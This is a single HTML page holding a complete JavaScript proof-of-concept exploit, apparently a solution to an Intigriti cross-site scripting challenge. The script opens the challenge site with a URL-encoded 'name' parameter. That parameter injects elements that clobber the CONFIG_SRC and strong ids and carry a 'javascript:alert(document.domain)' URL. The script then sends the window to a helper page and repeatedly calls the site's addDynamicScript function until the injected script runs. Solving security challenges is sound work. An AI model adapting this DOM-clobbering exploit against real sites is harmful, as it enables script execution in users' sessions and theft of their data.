<!DOCTYPE html>
<html>
<body>
<script>
    const targetUrl = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
    const backUrl = "https://pedrojuniorrd.github.io/_layouts/back.html?n=1";

    const w = window.open(targetUrl);

    function tryTrigger() {
        try {
            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
                console.log("âœ… Triggering addDynamicScript...");
                w.addDynamicScript();
                observer.disconnect();
                clearInterval(proactive);
            }
        } catch (e) {}
    }

    const observer = new MutationObserver(tryTrigger);

    setTimeout(() => {
        try {
            w.location = backUrl;
            w.addEventListener('DOMContentLoaded', () => {
                const doc = w.document;
                if (doc) {
                    observer.observe(doc, { childList: true, subtree: true });
                }
            });
        } catch (e) {}
    }, 3000);

    const proactive = setInterval(() => {
        tryTrigger();
    }, 1000);
</script>
</body>
</html>
